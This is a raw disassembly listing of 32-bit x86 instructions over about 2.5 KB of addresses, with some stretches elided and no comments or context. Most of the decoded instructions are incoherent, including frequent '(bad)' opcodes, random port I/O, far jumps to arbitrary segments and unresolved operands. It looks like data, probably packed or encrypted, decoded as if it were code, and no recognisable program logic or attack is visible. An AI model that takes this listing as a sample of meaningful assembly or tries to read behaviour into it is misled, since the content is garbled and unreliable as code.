  42d44f:	pushf  
  42d450:	and    BYTE PTR [edi+0x55],ah
  42d453:	cmp    ebx,DWORD PTR ds:0x98482c95
  42d459:	out    dx,eax
  42d45a:	xor    edi,DWORD PTR [edi+eax*4-0x25eb6f2d]
  42d461:	(bad)  
  42d462:	pusha  
  42d463:	shl    BYTE PTR [eax-0x4f],1
  42d466:	mov    edi,0x2439c6b
  42d46b:	adc    eax,DWORD PTR [ebp+0x3374e1]
  42d471:	imul   dh
  42d473:	int    0xe9
  42d475:	mov    ds:0x56d58131,al
  42d47a:	mov    al,ds:0xf3526be6
  42d47f:	(bad)  
  42d480:	ds sub al,0x7d
  42d483:	xchg   ecx,eax
  42d484:	jbe    0x42d4ee
  42d486:	sbb    DWORD PTR [eax],edx
  42d488:	retf   
  42d489:	aam    0x40
  42d48b:	cwde   
  42d48c:	mov    bh,0x24
  42d48e:	xor    BYTE PTR [edi+0x31d654db],bh
  42d494:	imul   edx,ebx,0x7484164d
  42d49a:	cli    
  42d49b:	inc    esp
  42d49c:	push   eax
  42d49d:	mov    dh,BYTE PTR [ebx]
  42d49f:	daa    
  42d4a0:	and    al,0xcb
  42d4a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d4a3:	dec    ebx
  42d4a4:	rcl    BYTE PTR [ebx+esi*2],0x38
  42d4a8:	pushf  
  42d4a9:	sbb    eax,0x270138f4
  42d4ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d4af:	xchg   edi,eax
  42d4b0:	fsubr  st,st(7)
  42d4b2:	fsub   QWORD PTR [esp+edx*8+0x0]
	...
  42d516:	cdq    
  42d517:	cmc    
  42d518:	adc    BYTE PTR [ebx-0x12],0x77
  42d51c:	fcos   
  42d51e:	add    BYTE PTR [ebx],al
  42d520:	nop
  42d521:	repz dec eax
  42d523:	fs js  0x42d569
  42d526:	push   esi
  42d527:	in     eax,0x1
  42d529:	add    BYTE PTR [edi],al
  42d52b:	add    DWORD PTR [eax],eax
  42d52d:	add    BYTE PTR [eax+0x62],dh
  42d530:	clc    
  42d531:	arpl   WORD PTR [ebp+0x7a08bf49],cx
  42d537:	lods   al,BYTE PTR ds:[esi]
  42d538:	add    dh,BYTE PTR [edx-0x25d2ed9f]
  42d53e:	push   0xcf5ecb0c
  42d543:	not    DWORD PTR [eax-0x50ee1b4f]
  42d549:	jbe    0x42d546
  42d54b:	dec    eax
  42d54c:	das    
  42d54d:	pop    ebp
  42d54e:	mov    esi,0x441d1b18
  42d553:	paddusw mm5,QWORD PTR [eax+eax*8-0x5c3b36]
  42d55b:	popa   
  42d55c:	push   esi
  42d55d:	push   es
  42d55e:	inc    esp
  42d55f:	adc    BYTE PTR [edx],al
  42d561:	jge    0x42d4ea
  42d563:	jle    0x42d566
  42d565:	sub    bx,bp
  42d568:	or     ebp,ebx
  42d56a:	and    al,0x13
  42d56d:	mov    ah,BYTE PTR [esi+0x73fd1d21]
  42d573:	icebp  
  42d574:	jp     0x42d553
  42d576:	ds cld 
  42d578:	jg     0x42d5f5
  42d57a:	loopne 0x42d566
  42d57c:	lahf   
  42d57d:	or     DWORD PTR [ebx+0x7],esp
  42d580:	ret    0x9f3c
  42d583:	shl    DWORD PTR [esi-0x46af4f0c],cl
  42d589:	jno    0x42d5e4
  42d58b:	cwde   
  42d58c:	dec    esi
  42d58d:	imul   esi,DWORD PTR [eax+eiz*1],0xf71b0fe4
  42d594:	pop    esp
  42d595:	int3   
  42d596:	or     ch,0xef
  42d599:	popf   
  42d59a:	imul   esp,DWORD PTR [ecx+0x33],0x249c7940
  42d5a1:	arpl   WORD PTR [esi*8+0x4ceb08c2],di
  42d5a8:	mov    esi,0x8d78a78d
  42d5ad:	sbb    eax,0x8d3879a5
  42d5b2:	inc    ecx
  42d5b3:	lods   al,BYTE PTR ds:[esi]
  42d5b4:	(bad)  
  42d5b5:	scas   al,BYTE PTR es:[edi]
  42d5b6:	stc    
  42d5b7:	inc    ebp
  42d5b8:	dec    esi
  42d5b9:	ins    BYTE PTR es:[edi],dx
  42d5ba:	inc    eax
  42d5bb:	lods   eax,DWORD PTR ds:[esi]
  42d5bc:	aad    0x13
  42d5be:	inc    edi
  42d5bf:	sahf   
  42d5c0:	push   ecx
  42d5c1:	in     al,0x3f
  42d5c3:	add    ecx,DWORD PTR [ebx]
  42d5c5:	pushf  
  42d5c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d5c7:	dec    esi
  42d5c8:	shr    DWORD PTR ds:0xf99a00e7,0x3d
  42d5cf:	mov    ds:0xc39380c8,eax
  42d5d4:	test   DWORD PTR [edi-0x4d],esp
  42d5d7:	pop    edx
  42d5d8:	ss loopne 0x42d5c0
  42d5db:	cmc    
  42d5dc:	add    dh,BYTE PTR [ebx]
  42d5de:	lea    edx,[ecx]
  42d5e0:	xor    BYTE PTR [esi+0x672a0d0e],ch
  42d5e6:	aaa    
  42d5e7:	les    edx,FWORD PTR [esi]
  42d5e9:	sbb    esp,DWORD PTR [eax+edx*4-0x5e]
  42d5ed:	test   DWORD PTR [edx+0x1eed8511],edi
  42d5f3:	add    eax,DWORD PTR [edi]
  42d5f5:	mov    al,BYTE PTR [edx+0x6d]
  42d5f8:	jb     0x42d666
  42d5fa:	int    0x69
  42d5fc:	mov    dh,0x9c
  42d5fe:	sub    esp,eax
  42d600:	pop    ds
  42d601:	or     BYTE PTR [edx-0x4cc73170],0x99
  42d608:	out    dx,eax
  42d609:	jecxz  0x42d632
  42d60b:	sbb    DWORD PTR [esi+0x3],ebx
  42d60e:	ret    0x9627
  42d611:	or     eax,0x5bff854d
  42d616:	loopne 0x42d607
  42d618:	push   esi
  42d619:	in     eax,dx
  42d61a:	or     al,0x4
  42d61c:	dec    ebx
  42d61d:	int3   
  42d61e:	sbb    dl,BYTE PTR [esi+ecx*1+0x1d31eab]
  42d625:	or     eax,DWORD PTR [ebx]
  42d627:	pop    ds
  42d628:	loopne 0x42d66a
  42d62a:	clc    
  42d62b:	inc    edi
  42d62c:	mov    edx,0x681fa915
  42d631:	and    DWORD PTR [edx+0x3e],eax
  42d634:	je     0x42d636
	...
  42d696:	repz add esp,DWORD PTR [eax]
  42d699:	(bad)  
  42d69a:	lock scas eax,DWORD PTR es:[edi]
  42d69c:	(bad)  
  42d69d:	jg     0x42d702
  42d69f:	mov    esp,0x8c7e8d59
  42d6a4:	or     cl,dl
  42d6a6:	pop    ebp
  42d6a7:	out    0x1,al
  42d6a9:	add    BYTE PTR [edi],al
  42d6ab:	add    DWORD PTR [eax],eax
  42d6ad:	add    bh,ch
  42d6af:	mov    bl,BYTE PTR [edi]
  42d6b1:	add    esp,DWORD PTR [ebp+0x4a]
  42d6b4:	vmwrite edx,DWORD PTR [edx-0x68e52b40]
  42d6bb:	push   esi
  42d6bc:	icebp  
  42d6bd:	mov    cl,0x6f
  42d6bf:	xchg   ebp,eax
  42d6c0:	push   es
  42d6c1:	and    cl,ah
  42d6c3:	repz idiv BYTE PTR [edx+edi*8+0xcaf9d01]
  42d6cb:	jne    0x42d6f1
  42d6cd:	jnp    0x42d74a
  42d6cf:	(bad)  
  42d6d0:	popw   es
  42d6d2:	in     al,dx
  42d6d3:	dec    esp
  42d6d4:	cmp    BYTE PTR [edx],ah
  42d6d6:	mov    edx,0x26142c72
  42d6db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d6dc:	in     eax,dx
  42d6dd:	(bad)  
  42d6de:	into   
  42d6df:	push   esp
  42d6e0:	test   al,0xf8
  42d6e2:	pop    edx
  42d6e3:	(bad)  
  42d6e4:	sub    DWORD PTR [ecx],edx
  42d6e6:	or     cl,BYTE PTR [eax+0x9]
  42d6e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d6ea:	out    0x69,al
  42d6ec:	cmc    
  42d6ed:	repnz std 
  42d6ef:	rol    DWORD PTR [eax+0x33],0xc6
  42d6f3:	mov    esi,0x9a0f47d8
  42d6f8:	popa   
  42d6f9:	lods   eax,DWORD PTR ds:[esi]
  42d6fa:	xchg   edi,eax
  42d6fb:	sahf   
  42d6fc:	mov    ds,WORD PTR [ebp+0x46097938]
  42d702:	pop    ebx
  42d703:	ja     0x42d6d0
  42d705:	and    esi,ebx
  42d707:	inc    edx
  42d708:	popa   
  42d709:	sar    DWORD PTR gs:[edx+0xc4d95e1],0xd4
  42d711:	xchg   ebx,eax
  42d712:	add    DWORD PTR [esi+edx*8+0x60],esi
  42d716:	or     al,BYTE PTR fs:[esi+0x3a]
  42d71a:	popf   
  42d71b:	out    0x45,eax
  42d71d:	push   ebx
  42d71e:	std    
  42d71f:	rcl    BYTE PTR [ecx+ebx*4-0x176d787c],cl
  42d726:	rol    BYTE PTR [esi+0xb],cl
  42d729:	sti    
  42d72a:	mov    ch,0x45
  42d72c:	xchg   dl,dl
  42d72e:	mov    ebp,0x304f6868
  42d733:	or     BYTE PTR [ecx-0x34],cl
  42d736:	push   0x8f4c4e41
  42d73b:	sub    eax,0x8bcd44c4
  42d740:	adc    al,BYTE PTR [esp+eax*8]
  42d743:	stos   BYTE PTR es:[edi],al
  42d744:	jnp    0x42d6c7
  42d746:	mov    cl,0x8
  42d748:	xchg   ebx,eax
  42d749:	nop
  42d74a:	popa   
  42d74b:	xlat   BYTE PTR ds:[ebx]
  42d74c:	push   ecx
  42d74d:	jb     0x42d717
  42d74f:	mov    eax,ds:0xe21ea4c5
  42d754:	push   0xffffffd5
  42d756:	dec    edi
  42d757:	cli    
  42d758:	inc    esp
  42d759:	pop    ss
  42d75a:	mov    bl,0x32
  42d75c:	(bad)  [eax-0x6335f677]
  42d762:	inc    esp
  42d763:	pop    ds
  42d764:	xchg   esp,eax
  42d765:	push   si
  42d767:	xor    al,0x97
  42d769:	mov    cl,BYTE PTR [eax-0x3bfcddc0]
  42d76f:	jo     0x42d73d
  42d771:	lods   eax,DWORD PTR ds:[esi]
  42d772:	push   ebx
  42d773:	jmp    0x42d7a5
  42d775:	xor    al,0xb4
  42d777:	or     DWORD PTR [ebp+0x4f62f5f6],eax
  42d77d:	inc    eax
  42d77e:	pop    eax
  42d77f:	cwde   
  42d780:	or     ah,BYTE PTR [eax+0x17222ddf]
  42d786:	dec    ebx
  42d787:	mov    dh,0xdb
  42d789:	bound  ebx,QWORD PTR [ebp-0x6b7de663]
  42d78f:	and    bl,BYTE PTR [ebx+0x13]
  42d792:	cmp    bh,bh
  42d794:	(bad)  
  42d795:	cmc    
  42d796:	daa    
  42d797:	inc    eax
  42d798:	in     al,dx
  42d799:	popa   
  42d79a:	sbb    BYTE PTR ds:0xf7addb49,dh
  42d7a0:	bound  edx,QWORD PTR [edi+0x57]
  42d7a3:	ss fcmovu st,st(0)
  42d7a6:	ret    0xfabd
  42d7a9:	shr    DWORD PTR [ecx-0x65],cl
  42d7ac:	add    BYTE PTR ds:[ebp-0x21b12c53],0x3e
  42d7b4:	xchg   esp,eax
	...
  42d815:	add    BYTE PTR [esi-0x62a06765],dl
  42d81b:	pop    edi
  42d81c:	xlat   BYTE PTR ds:[ebx]
  42d81d:	fld    TBYTE PTR [eax-0x2b]
  42d820:	push   0x48eba795
  42d825:	mov    edx,0x1e764
  42d82a:	pop    es
  42d82b:	add    DWORD PTR [eax],eax
  42d82d:	add    BYTE PTR [ebx+0x6a5b0c74],ah
  42d833:	inc    ebx
  42d834:	call   0x87ac:0x2866907c
  42d83b:	or     dl,al
  42d83d:	fwait
  42d83e:	push   DWORD PTR [ecx+0x62c54294]
  42d844:	xlat   BYTE PTR ds:[ebx]
  42d845:	xchg   edi,eax
  42d846:	mov    ah,0xd
  42d848:	(bad)  
  42d849:	bound  ebp,QWORD PTR [eax+0x5a27b0fa]
  42d84f:	into   
  42d850:	or     BYTE PTR [edi+ebp*4-0x3e],0x92
  42d855:	fldenv ds:0x1ce5ce35
  42d85b:	pop    esi
  42d85c:	jecxz  0x42d8b2
  42d85e:	and    dl,ah
  42d860:	imul   ecx,DWORD PTR [ecx+esi*1-0x7e566cee],0xffffffa1
  42d868:	mov    edi,0xafc5567e
  42d86d:	cmp    BYTE PTR [ebp-0xc4251e6],ch
  42d873:	sbb    DWORD PTR [edx],ebp
  42d875:	push   edi
  42d876:	jp     0x42d8af
  42d878:	jle    0x42d82b
  42d87a:	mov    ds:0xd025d0b9,al
  42d87f:	xchg   ebp,eax
  42d880:	into   
  42d881:	scas   al,BYTE PTR es:[edi]
  42d882:	push   ebp
  42d883:	jmp    DWORD PTR [esi-0x2]
  42d886:	and    al,0x9d
  42d888:	ret    0x9eb9
  42d88b:	push   ecx
  42d88c:	sbb    ebx,esi
  42d88e:	int3   
  42d88f:	shl    edx,1
  42d891:	sub    dl,BYTE PTR [edi+edi*1-0x7b8f68f1]
  42d898:	inc    esi
  42d899:	les    esp,FWORD PTR [esi+eiz*1+0x51]
  42d89d:	xor    dl,BYTE PTR [edi+0x33e689b4]
  42d8a3:	push   0xffffffea
  42d8a5:	push   esp
  42d8a6:	cmc    
  42d8a7:	imul   ebx,DWORD PTR [esp+ecx*4-0x1],0x1c8c6c85
  42d8af:	stc    
  42d8b0:	xlat   BYTE PTR ds:[ebx]
  42d8b1:	js     0x42d906
  42d8b3:	pushf  
  42d8b4:	mov    eax,ds:0x743b4872
  42d8b9:	(bad)  
  42d8ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d8bb:	iret   
  42d8bc:	pop    ecx
  42d8bd:	push   ss
  42d8be:	fistp  WORD PTR [eax]
  42d8c0:	inc    ebp
  42d8c1:	cs stos BYTE PTR es:[edi],al
  42d8c3:	mov    eax,ds:0x5dba333c
  42d8c8:	fbld   TBYTE PTR [ecx+esi*1]
  42d8cb:	pop    ss
  42d8cc:	mov    eax,ds:0x2b07efd6
  42d8d1:	stc    
  42d8d2:	push   ebx
  42d8d3:	push   ds
  42d8d4:	mov    eax,DWORD PTR [edx]
  42d8d6:	mov    esp,0x8df84b97
  42d8db:	pop    ebx
  42d8dc:	jmp    0xfbf6:0x69e17552
  42d8e3:	imul   eax,DWORD PTR [eax],0x1
  42d8e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d8e7:	mov    edx,0xb87033ef
  42d8ec:	ret    0x6fd
  42d8ef:	iret   
  42d8f0:	sbb    eax,0x85ba9c96
  42d8f5:	adc    eax,0x46a68d7c
  42d8fa:	xchg   DWORD PTR [ebx-0x1cb386df],esp
  42d900:	mov    dh,ah
  42d902:	push   0xffffffe8
  42d904:	clc    
  42d905:	cmp    BYTE PTR [ecx],dh
  42d907:	lock ror DWORD PTR [ebp-0x1e],1
  42d90b:	inc    esi
  42d90c:	sub    BYTE PTR ds:0xda1a8a36,dh
  42d912:	add    BYTE PTR [ebp+0x40],dl
  42d915:	loope  0x42d8f2
  42d917:	mov    edx,0x67094f0e
  42d91c:	mov    BYTE PTR [ebx-0x6e],0x39
  42d920:	and    eax,0x9605d51f
  42d925:	mov    ebx,0xd34b68c4
  42d92a:	add    DWORD PTR [ecx],edi
  42d92c:	test   DWORD PTR [ebx],ebx
  42d92e:	call   0x90ac:0xee2eabe5
	...
  42d995:	add    cl,bh
  42d997:	mov    cl,0x70
  42d999:	dec    eax
  42d99a:	js     0x42d965
  42d99c:	stc    
  42d99d:	mov    cl,0xcb
  42d99f:	mov    DWORD PTR ds:0x10786e14,ecx
  42d9a5:	mov    WORD PTR [ebx-0x18],gs
  42d9a8:	add    DWORD PTR [eax],eax
  42d9aa:	pop    es
  42d9ab:	add    DWORD PTR [eax],eax
  42d9ad:	add    cl,bl
  42d9af:	pushf  
  42d9b0:	sub    BYTE PTR [ecx],bh
  42d9b2:	ins    DWORD PTR es:[edi],dx
  42d9b3:	mov    bh,0xe8
  42d9b5:	ficomp WORD PTR [ecx]
  42d9b7:	clc    
  42d9b8:	dec    edx
  42d9b9:	fsubp  st(5),st
  42d9bb:	addr16 cli 
  42d9bd:	mov    ch,BYTE PTR [eax-0xf]
  42d9c0:	ins    BYTE PTR es:[edi],dx
  42d9c1:	cdq    
  42d9c2:	test   eax,0x82b1f377
  42d9c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d9c8:	inc    edx
  42d9c9:	push   esp
  42d9ca:	mov    ebp,0x6093e755
  42d9cf:	imul   esi,DWORD PTR [edi],0x333121bf
  42d9d5:	ja     0x42da16
  42d9d7:	hlt    
  42d9d8:	aas    
  42d9d9:	fwait
  42d9da:	mov    eax,0xbd9bf204
  42d9df:	xor    edx,DWORD PTR [eax+0x4b47a88b]
  42d9e5:	out    0xa4,al
  42d9e7:	retf   0xa9e7
  42d9ea:	jbe    0x42da55
  42d9ec:	sbb    esi,DWORD PTR [ebx-0x5b]
  42d9ef:	or     al,0xc7
  42d9f1:	adc    dh,BYTE PTR [edi-0x55a65623]
  42d9f7:	inc    esp
  42d9f8:	jp     0x42d97f
  42d9fa:	ja     0x42da63
  42d9fc:	or     al,0x8
  42d9fe:	adc    al,0xc2
  42da00:	sub    al,0x7b
  42da02:	in     al,0xd1
  42da04:	or     BYTE PTR [ebp+0x73],dh
  42da07:	mov    edx,0xd7730e24
  42da0c:	scas   al,BYTE PTR es:[edi]
  42da0d:	and    ch,BYTE PTR [edi-0x2e]
  42da10:	pop    esp
  42da11:	xchg   ebp,eax
  42da12:	mov    DWORD PTR [edi-0x938c1be],edi
  42da18:	xor    al,0xf
  42da1a:	mov    eax,0xd36401c5
  42da1f:	pop    es
  42da20:	push   es
  42da21:	call   0x7cca016b
  42da26:	jbe    0x42da10
  42da28:	dec    edx
  42da29:	mov    eax,0xc79b7e5b
  42da2e:	in     al,dx
  42da2f:	dec    esi
  42da30:	inc    eax
  42da31:	icebp  
  42da32:	jmp    0xbd709ad3
  42da37:	outs   dx,DWORD PTR ds:[esi]
  42da38:	pop    ebx
  42da39:	cmp    ebp,DWORD PTR [esi]
  42da3b:	adc    eax,0xbaf7ae35
  42da40:	fist   WORD PTR [ebp+0x43]
  42da43:	mov    bh,0x7e
  42da45:	push   ebp
  42da46:	icebp  
  42da47:	in     al,0x23
  42da49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42da4a:	fwait
  42da4b:	(bad)  
  42da4c:	jnp    0x59af664b
  42da52:	push   0xdf37be64
  42da57:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42da59:	jb     0x42da56
  42da5b:	pop    ebp
  42da5c:	arpl   WORD PTR [esp+eiz*4+0x42],si
  42da60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42da61:	add    DWORD PTR [edx-0x6b002f88],eax
  42da67:	add    eax,0x33002b64
  42da6c:	cmp    BYTE PTR [edx],cl
  42da6e:	dec    ebp
  42da6f:	hlt    
  42da70:	mov    ebx,DWORD PTR [eax-0x47f3c108]
  42da76:	repz mov edx,0xeabf6253
  42da7c:	add    dl,BYTE PTR [esi]
  42da7e:	ror    DWORD PTR [esi+0x53],cl
  42da81:	pop    ebp
  42da82:	outs   dx,DWORD PTR ds:[esi]
  42da83:	push   ebp
  42da84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42da85:	push   ss
  42da86:	inc    edx
  42da87:	addr16 nop
  42da89:	bound  esi,QWORD PTR [ebx]
  42da8b:	out    0x83,eax
  42da8d:	sbb    BYTE PTR [ecx-0x7b6e753e],cl
  42da93:	fiadd  DWORD PTR [esi-0x4e33db36]
  42da99:	sub    eax,0x542d4268
  42da9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42da9f:	pop    esp
  42daa0:	ret    0x62ed
  42daa3:	cs or  ch,bl
  42daa6:	cld    
  42daa7:	mov    dl,0x46
  42daa9:	add    esp,DWORD PTR [eax-0x32d209c]
  42daaf:	jae    0x42da45
  42dab1:	add    ah,BYTE PTR [ecx]
  42dab3:	jmp    0x42db27
	...
  42db15:	add    BYTE PTR [eax-0x2093e086],dh
  42db1b:	ins    DWORD PTR es:[edi],dx
  42db1c:	repz inc cl
  42db1f:	jae    0x42db79
  42db21:	jg     0x42dae1
  42db23:	pop    ebp
  42db24:	loop   0x42db7c
  42db26:	jb     0x42db11
  42db28:	add    DWORD PTR [eax],eax
  42db2a:	pop    es
  42db2b:	add    DWORD PTR [eax],eax
  42db2d:	add    cl,ch
  42db2f:	ret    0x3e92
  42db32:	jnp    0x42db64
  42db34:	push   ds
  42db35:	pusha  
  42db36:	xchg   esp,eax
  42db37:	or     al,0x4b
  42db39:	xor    esp,edx
  42db3b:	jae    0x42dbad
  42db3d:	jp     0x42daf3
  42db3f:	cmp    eax,DWORD PTR [ebx]
  42db41:	fwait
  42db42:	pop    ecx
  42db43:	dec    edi
  42db44:	nop
  42db45:	aad    0x9d
  42db47:	shl    DWORD PTR [ebx-0x4a],1
  42db4a:	out    0xdc,eax
  42db4c:	imul   esp,DWORD PTR [ecx],0x53
  42db4f:	xchg   edi,eax
  42db50:	cmc    
  42db51:	sbb    bl,BYTE PTR [eax+0x25]
  42db54:	sbb    eax,0x9a65255
  42db59:	cwde   
  42db5a:	or     bl,BYTE PTR [eax-0x28]
  42db5d:	push   esp
  42db5e:	adc    bl,BYTE PTR [eax]
  42db60:	test   eax,esp
  42db62:	push   ebx
  42db63:	cli    
  42db64:	nop
  42db65:	lods   eax,DWORD PTR ds:[esi]
  42db66:	pop    ebp
  42db67:	iret   
  42db68:	(bad)  
  42db69:	push   ds
  42db6a:	repnz mov bh,0xb5
  42db6d:	retf   0xebf3
  42db70:	xchg   edx,eax
  42db71:	je     0x42dbde
  42db73:	(bad)  
  42db74:	fldenv [ebp-0x34637db]
  42db7a:	jo     0x42dbaf
  42db7c:	or     DWORD PTR [edi+0x720c0850],edi
  42db82:	fwait
  42db83:	push   edx
  42db84:	fnstenv [esi-0x23bf9788]
  42db8a:	leave  
  42db8b:	push   ds
  42db8c:	(bad)  
  42db8d:	xchg   esp,eax
  42db8e:	mov    WORD PTR [ebx+ebp*2],?
  42db91:	adc    BYTE PTR [edx],bl
  42db93:	inc    esi
  42db94:	pop    ebp
  42db95:	sub    ebx,DWORD PTR [esi-0x624602f1]
  42db9b:	in     al,0xcd
  42db9d:	(bad)  
  42db9e:	pop    eax
  42db9f:	dec    esi
  42dba0:	sub    ecx,DWORD PTR [ebx-0x534ec748]
  42dba6:	sbb    eax,0x46614867
  42dbab:	jae    0x42db5d
  42dbad:	gs fsubp st(6),st
  42dbb0:	sbb    al,BYTE PTR [eax-0x207422a8]
  42dbb6:	add    eax,0xdfd6e903
  42dbbb:	xchg   esi,eax
  42dbbc:	cmp    DWORD PTR [eax+0x6a81ec02],0xec2ca3c2
  42dbc6:	lds    ebx,FWORD PTR [edx+esi*4+0x6a78adb]
  42dbcd:	hlt    
  42dbce:	out    dx,al
  42dbcf:	dec    eax
  42dbd0:	int3   
  42dbd1:	mov    ?,WORD PTR [ebp-0x6bde4b8c]
  42dbd7:	adc    BYTE PTR [ebp+edx*2-0x16],dl
  42dbdb:	pusha  
  42dbdc:	mov    ah,0xbf
  42dbde:	mov    dl,0xaf
  42dbe0:	mov    ch,0xf
  42dbe2:	(bad)  
  42dbe3:	mov    al,0xa3
  42dbe5:	mov    ah,0x89
  42dbe7:	dec    ebp
  42dbe8:	dec    ebx
  42dbe9:	push   es
  42dbea:	popf   
  42dbeb:	pop    ecx
  42dbec:	aad    0xd0
  42dbee:	pop    esp
  42dbef:	pop    eax
  42dbf0:	mov    bl,0xe3
  42dbf2:	and    al,0x41
  42dbf4:	add    cl,BYTE PTR [eax]
  42dbf6:	jp     0x42dc38
  42dbf8:	scas   al,BYTE PTR es:[edi]
  42dbf9:	push   es
  42dbfa:	fild   DWORD PTR [ebp-0x2e]
  42dbfd:	push   esp
  42dbfe:	jae    0x42db8d
  42dc00:	fisub  DWORD PTR [esp+ebx*1]
  42dc03:	out    0x54,eax
  42dc05:	xchg   edi,eax
  42dc06:	jp     0x42db8a
  42dc08:	xor    edi,DWORD PTR [ebx+0x2c0e2b52]
  42dc0e:	push   ss
  42dc0f:	mul    DWORD PTR [ebx]
  42dc11:	pop    ebx
  42dc12:	hlt    
  42dc13:	ins    BYTE PTR es:[edi],dx
  42dc14:	or     esp,DWORD PTR [ebx+ebx*8+0x4]
  42dc18:	lahf   
  42dc19:	dec    edx
  42dc1a:	jp     0x42dc1a
  42dc1c:	xchg   edi,eax
  42dc1d:	ret    0x4af3
  42dc20:	sbb    ebx,eax
  42dc22:	sub    cl,BYTE PTR [edi+0x7d]
  42dc25:	sub    ch,ah
  42dc27:	push   ss
  42dc28:	push   ds
  42dc29:	xchg   BYTE PTR [ebx-0x18],cl
  42dc2c:	fild   WORD PTR [edi+ecx*4]
  42dc2f:	nop
  42dc30:	xor    al,0x5b
  42dc32:	stc    
  42dc33:	xor    eax,0x89
	...
  42dc94:	add    BYTE PTR [eax],al
  42dc96:	cmp    DWORD PTR [edi-0x2010f093],esi
  42dc9c:	jnp    0x42dc55
  42dc9e:	es mov esp,0xad4ef285
  42dca4:	and    BYTE PTR cs:[ecx-0x16],bh
  42dca8:	add    DWORD PTR [eax],eax
  42dcaa:	pop    es
  42dcab:	add    DWORD PTR [eax],eax
  42dcad:	add    BYTE PTR [esi+eax*8-0x6b],bl
  42dcb1:	leave  
  42dcb2:	or     al,0x6
  42dcb4:	add    al,0x64
  42dcb6:	jbe    0x42dc61
  42dcb8:	test   al,0xce
  42dcba:	in     eax,dx
  42dcbb:	aaa    
  42dcbc:	daa    
  42dcbd:	and    cl,dh
  42dcbf:	add    eax,0xdec65106
  42dcc4:	or     cl,al
  42dcc6:	push   esp
  42dcc7:	nop
  42dcc8:	(bad)  
  42dcc9:	mov    ebx,0x2ea98771
  42dcce:	test   al,0x7
  42dcd0:	pop    eax
  42dcd1:	call   0xbd7e:0x8a1e2177
  42dcd8:	cmp    eax,0xc987a5fb
  42dcdd:	stos   DWORD PTR es:[edi],eax
  42dcde:	add    edx,DWORD PTR [ecx+esi*1-0x1e]
  42dce2:	cdq    
  42dce3:	pop    esp
  42dce4:	test   eax,0x42c18249
  42dce9:	push   eax
  42dcea:	add    BYTE PTR [eax-0xe2391f5],0x3
  42dcf1:	mov    ah,0x19
  42dcf3:	mov    edi,0x38ceea8a
  42dcf8:	push   cs
  42dcf9:	cmp    al,0x2c
  42dcfb:	int3   
  42dcfc:	pop    ecx
  42dcfd:	arpl   WORD PTR [ebx+0x1c],sp
  42dd00:	fld    TBYTE PTR [esi-0x1284868b]
  42dd06:	mov    eax,0xd57ec366
  42dd0b:	xchg   BYTE PTR [ebp+0x66],al
  42dd0e:	adc    al,0x49
  42dd10:	mov    BYTE PTR ds:0x2c1d3119,dh
  42dd16:	mov    al,0x4e
  42dd18:	dec    ebx
  42dd19:	cli    
  42dd1a:	inc    ecx
  42dd1b:	or     cl,BYTE PTR [ebx+0x28]
  42dd1e:	jge    0x42dd33
  42dd20:	test   eax,0xf9fe7e22
  42dd25:	mov    cs,ebp
  42dd27:	loop   0x42dcf4
  42dd29:	cmp    al,0xa7
  42dd2b:	pop    ds
  42dd2c:	enter  0x95f2,0xf4
  42dd30:	mov    edi,0xad6221af
  42dd35:	dec    eax
  42dd36:	cld    
  42dd37:	rcl    BYTE PTR [ebp+0x27],0x7f
  42dd3b:	jmp    0xa685954f
  42dd40:	mov    esi,DWORD PTR [ebx+0x3f92765a]
  42dd46:	xor    bl,BYTE PTR ss:[ebp+0x199f7a40]
  42dd4d:	mov    ch,0x19
  42dd4f:	popf   
  42dd50:	inc    edi
  42dd51:	jle    0x42dd6c
  42dd53:	daa    
  42dd54:	jnp    0x42dd67
  42dd56:	or     al,0x2e
  42dd58:	xor    eax,0x9cb3f03e
  42dd5d:	mov    dl,0x7e
  42dd5f:	stos   DWORD PTR es:[edi],eax
  42dd60:	les    esi,FWORD PTR [esi-0x46]
  42dd63:	loope  0x42ddd6
  42dd65:	iret   
  42dd66:	push   esi
  42dd67:	sbb    eax,0xb821866d
  42dd6c:	and    ch,BYTE PTR [ebp-0x64d7278b]
  42dd72:	cdq    
  42dd73:	adc    ebx,0x53
  42dd76:	fisub  WORD PTR [edx+0x52cdda1]
  42dd7c:	add    BYTE PTR [ecx+eiz*1],ah
  42dd7f:	mov    esi,0x3f1a630e
  42dd84:	shl    BYTE PTR [ebx+0x2f063b7f],1
  42dd8a:	jns    0x42dd1f
  42dd8c:	add    esp,DWORD PTR [ebx+0x34]
  42dd8f:	(bad)  
  42dd91:	aaa    
  42dd92:	out    dx,eax
  42dd93:	(bad)  
  42dd94:	cli    
  42dd95:	xchg   edx,eax
  42dd96:	mov    edi,0xd6292aef
  42dd9b:	sub    BYTE PTR [edx+0x76a87509],bh
  42dda1:	nop
  42dda2:	cmp    edi,esp
  42dda4:	cmp    edi,DWORD PTR [edx+0x44]
  42dda7:	popf   
  42dda8:	in     eax,dx
  42dda9:	icebp  
  42ddaa:	les    ebx,FWORD PTR [esi+0x59950c27]
  42ddb0:	mov    cl,0xed
  42ddb2:	ins    DWORD PTR es:[edi],dx
  42ddb3:	cmp    ch,BYTE PTR [edx+0x0]
	...
  42de15:	add    dh,ah
  42de17:	sub    BYTE PTR [ebp-0x1c012cd],0xd7
  42de1e:	jns    0x42ddf6
  42de20:	mov    ebp,0x6ce44907
  42de25:	data16 sub bl,0x1
  42de29:	add    BYTE PTR [edi],al
  42de2b:	add    DWORD PTR [eax],eax
  42de2d:	add    BYTE PTR [ebp-0x7f],ch
  42de30:	inc    ecx
  42de31:	pop    es
  42de32:	call   0x8888bd41
  42de37:	push   esi
  42de38:	mov    dl,ch
  42de3a:	mov    ebx,0x8522b36c
  42de3f:	inc    eax
  42de40:	adc    BYTE PTR [ecx+ecx*4],ah
  42de43:	push   0x6a
  42de45:	dec    esi
  42de46:	call   0xab652230
